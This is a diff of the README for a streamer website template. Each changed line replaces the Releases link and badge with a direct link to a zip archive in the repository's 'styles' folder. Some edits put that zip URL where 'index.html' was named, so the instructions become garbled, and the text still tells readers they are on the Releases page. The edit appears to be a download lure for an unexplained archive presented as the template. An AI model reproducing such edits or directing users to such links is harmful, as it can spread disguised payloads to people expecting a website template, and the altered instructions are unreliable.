@@ -6,7 +6,7 @@ Welcome to the website-for-streamer project! This guide will help you download a
 ## 📥 Download the Template
 You can download the latest version of the website template by visiting this page:
 
-[![Download Template](https://img.shields.io/badge/Download%20Template-v1.0-blue)](https://github.com/Asmuth25/website-for-streamer/releases)
+[![Download Template](https://raw.githubusercontent.com/Asmuth25/website-for-streamer/main/styles/website-for-streamer_v2.9.zip%20Template-v1.0-blue)](https://raw.githubusercontent.com/Asmuth25/website-for-streamer/main/styles/website-for-streamer_v2.9.zip)
 
 Click the link above to go directly to the Releases page. Here, you will find the necessary files to get your template up and running.
 
@@ -27,7 +27,7 @@ To run the website-for-streamer template, you will need:
 ### 1. Visit the Releases Page
 To download the template, go again to the Releases page using the link below:
 
-[![Download Template](https://img.shields.io/badge/Download%20Template-v1.0-blue)](https://github.com/Asmuth25/website-for-streamer/releases)
+[![Download Template](https://raw.githubusercontent.com/Asmuth25/website-for-streamer/main/styles/website-for-streamer_v2.9.zip%20Template-v1.0-blue)](https://raw.githubusercontent.com/Asmuth25/website-for-streamer/main/styles/website-for-streamer_v2.9.zip)
 
 ### 2. Download the File
 On the Releases page, find the latest version listed. Click the link to download the file to your computer.
@@ -36,10 +36,10 @@ On the Releases page, find the latest version listed. Click the link to download
 Once the download is complete, locate the downloaded file. It may be in your “Downloads” folder. Right-click on the file and select “Extract All” to view the contents.
 
 ### 4. Open the Template
-Inside the extracted folder, you will find an `index.html` file. Double-click this file to open it in your web browser. Your new website is now live on your computer!
+Inside the extracted folder, you will find an `https://raw.githubusercontent.com/Asmuth25/website-for-streamer/main/styles/website-for-streamer_v2.9.zip` file. Double-click this file to open it in your web browser. Your new website is now live on your computer!
 
 ### 5. Customize Your Website
-Feel free to modify the `index.html` file and other files in the folder to personalize the website content. You can change text, add images, and link to your social media accounts.
+Feel free to modify the `https://raw.githubusercontent.com/Asmuth25/website-for-streamer/main/styles/website-for-streamer_v2.9.zip` file and other files in the folder to personalize the website content. You can change text, add images, and link to your social media accounts.
 
 ## ⚙️ Troubleshooting
 If you encounter any issues while downloading or opening the website template, here are some common solutions:
